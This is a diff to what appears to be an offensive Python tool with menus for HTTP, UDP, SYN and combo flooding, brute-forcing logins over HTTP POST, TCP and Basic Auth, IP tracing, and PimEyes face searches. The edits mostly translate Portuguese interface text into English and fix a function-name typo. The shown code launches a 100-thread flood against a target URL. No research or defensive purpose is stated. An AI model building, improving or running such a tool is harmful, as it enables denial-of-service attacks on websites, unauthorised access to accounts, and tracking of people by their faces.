@@ -72,7 +72,7 @@ def combo_flood(url):
     port_tcp = 80 if url.startswith("http://") else 443
     port_udp = random.choice([53,80,443,123])
     t=100
-    print(f"Iniciando combo com {t} threads...")
+    print(f"Starting combo com {t} threads...")
     with ThreadPoolExecutor(max_workers=t*3) as ex:
         for _ in range(t):
             ex.submit(http_flood, url)
@@ -156,7 +156,7 @@ def pimeyes_search(query):
     except Exception as e:
         print("Erro:", e)
 
-# === MENUS ===
+# === MENU ===
 def menu():
     banner()
     print(f"{C.Y}1{C.E} - Attack")
@@ -164,22 +164,22 @@ def menu():
     print(f"{C.Y}3{C.E} - Tracking IP")
     print(f"{C.Y}4{C.E} - PimEyes Search")
     print(f"{C.Y}0{C.E} - To Go")
-    return input("Escolha: ").strip()
+    return input("Choice: ").strip()
 
-def menu_ataques():
+def menu_attacks():
     clear(); print(f"{C.R}=== ATTACK ==={C.E}")
-    print("1 - HTTP Flood\n2 - UDP Flood\n3 - SYN Flood\n4 - Combo\n0 - Voltar")
-    return input("Opção: ").strip()
+    print("1 - HTTP Flood\n2 - UDP Flood\n3 - SYN Flood\n4 - Combo\n0 - Back")
+    return input("Option: ").strip()
 
 def menu_brute():
     clear(); print(f"{C.R}=== BRUTE FORCE ==={C.E}")
-    print("1 - MegaMedusa (HTTP POST)\n2 - Pandora (TCP)\n3 - HTTP Basic Auth\n0 - Voltar")
-    return input("Opção: ").strip()
+    print("1 - MegaMedusa (HTTP POST)\n2 - Pandora (TCP)\n3 - HTTP Basic Auth\n0 - Back")
+    return input("Option: ").strip()
 
 def menu_trace():
     clear(); print(f"{C.R}=== TRACKING IP ==={C.E}")
-    print("1 - Trace IP\n0 - Voltar")
-    return input("Opção: ").strip()
+    print("1 - Trace IP\n0 - Back")
+    return input("Option: ").strip()
 
 def menu_pimeyes():
     clear(); print(f"{C.R}=== PIMEYES ==={C.E}")
@@ -191,7 +191,7 @@ def main():
     while True:
         op = menu()
         if op=="1":
-            ao = menu_atyacks()
+            ao = menu_attacks()
             if ao=="1":
                 url=input("URL target: ")
                 t=int(input("Threads: "))
